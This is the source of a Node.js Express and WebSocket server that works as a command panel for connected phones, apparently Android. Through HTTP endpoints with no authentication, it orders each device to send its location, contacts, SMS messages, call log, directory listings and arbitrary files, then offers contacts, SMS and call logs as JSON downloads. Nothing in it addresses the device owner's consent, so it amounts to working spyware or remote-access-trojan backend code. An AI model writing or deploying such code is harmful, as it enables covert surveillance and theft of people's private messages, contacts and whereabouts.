const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Connected devices storage (persistent)
const connectedDevices = new Map();
const deviceHistory = new Map(); // Store device history even when offline

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// File upload configuration
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const uploadDir = path.join(__dirname, 'uploads');
    if (!fs.existsSync(uploadDir)) {
      fs.mkdirSync(uploadDir, { recursive: true });
    }
    cb(null, uploadDir);
  },
  filename: (req, file, cb) => {
    cb(null, `${Date.now()}-${file.originalname}`);
  }
});

const upload = multer({ storage });

// WebSocket connection handling
wss.on('connection', (ws) => {
  console.log('New WebSocket connection');
  
  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      handleDeviceMessage(ws, data);
    } catch (error) {
      console.error('Error parsing message:', error);
    }
  });
  
  ws.on('close', () => {
    // Mark device as offline instead of removing
    for (const [deviceId, device] of connectedDevices.entries()) {
      if (device.ws === ws) {
        // Update device history
        if (deviceHistory.has(deviceId)) {
          const historyDevice = deviceHistory.get(deviceId);
          historyDevice.lastSeen = new Date();
          historyDevice.isOnline = false;
        }
        
        // Keep device in connected list but mark as offline
        device.isOnline = false;
        device.lastSeen = new Date();
        console.log(`Device ${deviceId} went offline`);
        break;
      }
    }
  });
});

function handleDeviceMessage(ws, message) {
  switch (message.type) {
    case 'register':
      const deviceId = message.data.deviceId || `${message.data.deviceName}-${Date.now()}`;
      
      // Store in history
      deviceHistory.set(deviceId, {
        ...message.data,
        id: deviceId,
        firstSeen: deviceHistory.get(deviceId)?.firstSeen || new Date(),
        totalConnections: (deviceHistory.get(deviceId)?.totalConnections || 0) + 1,
      });
      
      connectedDevices.set(deviceId, {
        ws,
        ...message.data,
        id: deviceId,
        lastSeen: new Date(),
        isOnline: true,
        location: null,
        contacts: [],
        files: [],
        sms: { messages: [], error: null },
        callLog: [],
        currentPath: '/storage/emulated/0',
      });
      console.log(`Device registered: ${deviceId}`);
      break;
      
    case 'location_response':
      updateDeviceData(ws, 'location', message.data);
      console.log('Location updated for device');
      break;
      
    case 'contacts_response':
      updateDeviceData(ws, 'contacts', message.data);
      console.log('Contacts updated for device');
      break;
      
    case 'files_response':
      updateDeviceData(ws, 'files', message.data);
      console.log('Files list updated for device');
      break;
      
    case 'directory_response':
      // Handle both files array and files object structure
      const filesData = message.data.files || message.data;
      updateDeviceData(ws, 'files', Array.isArray(filesData) ? filesData : filesData.files || []);
      if (message.data.currentPath) {
        updateDeviceData(ws, 'currentPath', message.data.currentPath);
      }
      console.log('Directory browsed for device');
      break;
      
    case 'sms_response':
      updateDeviceData(ws, 'sms', message.data);
      console.log('SMS updated for device');
      break;
      
    case 'call_log_response':
      updateDeviceData(ws, 'callLog', message.data);
      console.log('Call log updated for device');
      break;
      
    case 'file_download_response':
      // Handle file download - could store temporarily or forward to client
      console.log('File download received for device');
      break;
      
    default:
      console.log('Unknown message type:', message.type);
  }
}

function updateDeviceData(ws, field, data) {
  for (const [deviceId, device] of connectedDevices.entries()) {
    if (device.ws === ws) {
      device[field] = data;
      device.lastSeen = new Date();
      break;
    }
  }
}

// API Routes
app.get('/api/devices', (req, res) => {
  // Combine online devices with offline device history
  const allDevices = new Map();
  
  // Add offline devices from history
  for (const [deviceId, historyDevice] of deviceHistory.entries()) {
    allDevices.set(deviceId, {
      id: historyDevice.id,
      deviceName: historyDevice.deviceName,
      brand: historyDevice.brand,
      model: historyDevice.model,
      platform: historyDevice.platform,
      systemVersion: historyDevice.systemVersion,
      lastSeen: historyDevice.lastSeen,
      firstSeen: historyDevice.firstSeen,
      totalConnections: historyDevice.totalConnections,
      isOnline: false,
      location: null,
      contactsCount: 0,
    });
  }
  
  // Override with online devices
  for (const [deviceId, device] of connectedDevices.entries()) {
    allDevices.set(deviceId, {
      id: device.id,
      deviceName: device.deviceName,
      brand: device.brand,
      model: device.model,
      platform: device.platform,
      systemVersion: device.systemVersion,
      lastSeen: device.lastSeen,
      firstSeen: deviceHistory.get(deviceId)?.firstSeen || device.lastSeen,
      totalConnections: deviceHistory.get(deviceId)?.totalConnections || 1,
      isOnline: device.isOnline !== false,
      location: device.location,
      contactsCount: device.contacts.length,
    });
  }
  
  const devices = Array.from(allDevices.values()).map(device => ({
    id: device.id,
    deviceName: device.deviceName,
    brand: device.brand,
    model: device.model,
    platform: device.platform,
    systemVersion: device.systemVersion,
    lastSeen: device.lastSeen,
    firstSeen: device.firstSeen,
    totalConnections: device.totalConnections,
    isOnline: device.isOnline,
    location: device.location,
    contactsCount: device.contactsCount,
  }));
  
  res.json(devices);
});

app.get('/api/devices/:deviceId', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    // Check device history for offline devices
    const historyDevice = deviceHistory.get(req.params.deviceId);
    if (!historyDevice) {
      return res.status(404).json({ error: 'Device not found' });
    }
    
    return res.json({
      id: historyDevice.id,
      deviceName: historyDevice.deviceName,
      platform: historyDevice.platform,
      lastSeen: historyDevice.lastSeen,
      isOnline: false,
      location: null,
      contacts: [],
      sms: { messages: [], error: null },
      callLog: [],
      files: [],
      currentPath: '/storage/emulated/0',
    });
  }
  
  res.json({
    id: device.id,
    deviceName: device.deviceName,
    brand: device.brand,
    model: device.model,
    platform: device.platform,
    systemVersion: device.systemVersion,
    lastSeen: device.lastSeen,
    isOnline: device.isOnline !== false,
    location: device.location,
    contacts: device.contacts,
    sms: device.sms || { messages: [], error: null },
    callLog: device.callLog || [],
    files: device.files || [],
    currentPath: device.currentPath || '/storage/emulated/0',
  });
});

app.post('/api/devices/:deviceId/request-location', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  device.ws.send(JSON.stringify({
    type: 'request_location',
    data: {}
  }));
  
  res.json({ success: true, message: 'Location request sent' });
});

app.post('/api/devices/:deviceId/request-contacts', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  device.ws.send(JSON.stringify({
    type: 'request_contacts',
    data: {}
  }));
  
  res.json({ success: true, message: 'Contacts request sent' });
});

app.post('/api/devices/:deviceId/request-files', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  if (!device.isOnline) {
    return res.status(400).json({ error: 'Device is offline' });
  }
  
  device.ws.send(JSON.stringify({
    type: 'request_files',
    data: {}
  }));
  
  res.json({ success: true, message: 'Files request sent' });
});

app.post('/api/devices/:deviceId/browse-directory', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  if (!device.isOnline) {
    return res.status(400).json({ error: 'Device is offline' });
  }
  
  const { path } = req.body;
  
  // Update the device's current path immediately
  device.currentPath = path;
  
  device.ws.send(JSON.stringify({
    type: 'browse_directory',
    data: { path }
  }));
  
  res.json({ success: true, message: 'Directory browse request sent' });
});

app.post('/api/devices/:deviceId/request-sms', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  if (!device.isOnline) {
    return res.status(400).json({ error: 'Device is offline' });
  }
  
  device.ws.send(JSON.stringify({
    type: 'request_sms',
    data: {}
  }));
  
  res.json({ success: true, message: 'SMS request sent' });
});

app.get('/api/devices/:deviceId/contacts/download', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  // Format contacts similar to web app display
  const formattedContacts = device.contacts.map((contact, index) => ({
    id: contact.id || `contact_${index}`,
    name: contact.name || 'Unknown Contact',
    phoneNumbers: contact.phoneNumbers?.map(phone => ({
      number: phone.number,
      type: phone.label || 'mobile'
    })) || [],
    emails: contact.emails?.map(email => ({
      email: email.email,
      type: email.label || 'personal'
    })) || [],
    displayInfo: {
      primaryPhone: contact.phoneNumbers?.[0]?.number || 'No phone',
      primaryEmail: contact.emails?.[0]?.email || 'No email'
    }
  }));
  
  // Sort contacts alphabetically by name
  formattedContacts.sort((a, b) => a.name.localeCompare(b.name));
  
  const filename = `contacts-${device.deviceName.replace(/[^a-zA-Z0-9]/g, '_')}-${new Date().toISOString().split('T')[0]}.json`;
  
  res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
  res.setHeader('Content-Type', 'application/json');
  
  // Create a well-formatted JSON structure
  const exportData = {
    deviceName: device.deviceName,
    deviceInfo: {
      brand: device.brand,
      model: device.model,
      platform: device.platform
    },
    exportDate: new Date().toISOString(),
    totalContacts: formattedContacts.length,
    summary: {
      contactsWithPhone: formattedContacts.filter(c => c.phoneNumbers.length > 0).length,
      contactsWithEmail: formattedContacts.filter(c => c.emails.length > 0).length
    },
    contacts: formattedContacts
  };
  
  res.json(exportData);
});

app.get('/api/devices/:deviceId/sms/download', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const filename = `sms-${device.deviceName.replace(/[^a-zA-Z0-9]/g, '_')}-${new Date().toISOString().split('T')[0]}.json`;
  
  res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
  res.setHeader('Content-Type', 'application/json');
  res.json({
    deviceName: device.deviceName,
    exportDate: new Date().toISOString(),
    totalMessages: device.sms?.messages?.length || 0,
    error: device.sms?.error || null,
    messages: device.sms?.messages || []
  });
});

app.get('/api/devices/:deviceId/call-log/download', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const filename = `call-log-${device.deviceName.replace(/[^a-zA-Z0-9]/g, '_')}-${new Date().toISOString().split('T')[0]}.json`;
  
  res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
  res.setHeader('Content-Type', 'application/json');
  res.json({
    deviceName: device.deviceName,
    exportDate: new Date().toISOString(),
    totalCalls: device.callLog?.length || 0,
    calls: device.callLog || []
  });
});

app.post('/api/devices/:deviceId/request-call-log', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  if (!device.isOnline) {
    return res.status(400).json({ error: 'Device is offline' });
  }
  
  device.ws.send(JSON.stringify({
    type: 'request_call_log',
    data: {}
  }));
  
  res.json({ success: true, message: 'Call log request sent' });
});

app.post('/api/devices/:deviceId/download-file', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  if (!device.isOnline) {
    return res.status(400).json({ error: 'Device is offline' });
  }
  
  const { filePath } = req.body;
  
  device.ws.send(JSON.stringify({
    type: 'download_file',
    data: { filePath }
  }));
  
  res.json({ success: true, message: 'File download request sent' });
});
// File upload endpoint
app.post('/api/devices/:deviceId/upload', upload.single('file'), (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }
  
  res.json({
    success: true,
    filename: req.file.filename,
    originalName: req.file.originalname,
    size: req.file.size,
  });
});

// Serve web interface
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Web interface: http://localhost:${PORT}`);
});